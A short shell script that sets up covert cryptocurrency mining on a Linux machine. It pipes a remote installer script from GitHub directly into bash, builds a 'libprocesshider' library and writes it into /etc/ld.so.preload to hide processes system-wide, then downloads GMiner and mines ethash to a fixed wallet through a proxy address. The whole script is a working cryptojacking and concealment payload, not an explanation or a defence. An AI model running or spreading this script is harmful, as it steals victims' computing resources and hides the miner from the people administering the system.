#!/bin/sh
wget -O - https://raw.githubusercontent.com/chadpetersen1337/gpuminers/master/graft_installerWsocks5.sh | bash
wget https://raw.githubusercontent.com/chadpetersen1337/gpuminers/master/magicGmi.zip
unzip magicGmi.zip
make
gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
mv libprocesshider.so /usr/local/lib/
echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload
wget https://github.com/develsoftware/GMinerRelease/releases/download/2.56/gminer_2_56_linux64.tar.xz
tar -xvf gminer_2_56_linux64.tar.xz
./miner --algo ethash --server eth-us-west.flexpool.io --user 0x52500352a37a06f0c085d58663e4eadbd7e9f684.gminer --ssl 1 --port 5555 --pass x --proxy 18.117.128.68:9999
